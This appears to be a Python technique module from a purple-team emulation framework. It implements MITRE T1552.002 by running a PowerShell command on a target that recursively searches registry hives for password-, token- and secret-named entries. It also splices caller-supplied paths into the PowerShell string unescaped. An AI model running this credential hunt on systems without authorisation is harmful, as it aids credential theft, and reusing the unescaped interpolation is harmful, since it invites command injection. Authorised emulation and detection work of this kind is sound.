from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        registry_paths = parameters.get("registry_paths", "HKLM\\SOFTWARE;HKCU\\SOFTWARE")
        paths = registry_paths.split(";")
        path_filter = ",".join(f"'{p}'" for p in paths)
        ps_cmd = (
            f"$regPaths = @({path_filter}); "
            "$results = @(); "
            "foreach ($regPath in $regPaths) { "
            "try { "
            "$subkeys = Get-ChildItem -Path $regPath -Recurse -ErrorAction SilentlyContinue; "
            "foreach ($subkey in $subkeys) { "
            "try { "
            "$props = Get-ItemProperty -Path $subkey.PSPath -ErrorAction SilentlyContinue; "
            "$credProps = $props.PSObject.Properties | Where-Object { "
            "$_.Name -match 'Password|PWD|Credential|SecureString|Pass|Key|Secret|Token' "
            '}; '
            "foreach ($cp in $credProps) { "
            '$results += "Key: ' + '$subkey.PSPath | Name: ' + '$cp.Name" '
            "} } catch { } } } catch { } }; "
            '"Credential-related registry entries found: " + $results.Count; $results'
        )
        result = await conn.run_ps(ps_cmd)
        return TechniqueResult(
            technique_id="T1552.002",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1552.002 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1552.002",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    pass
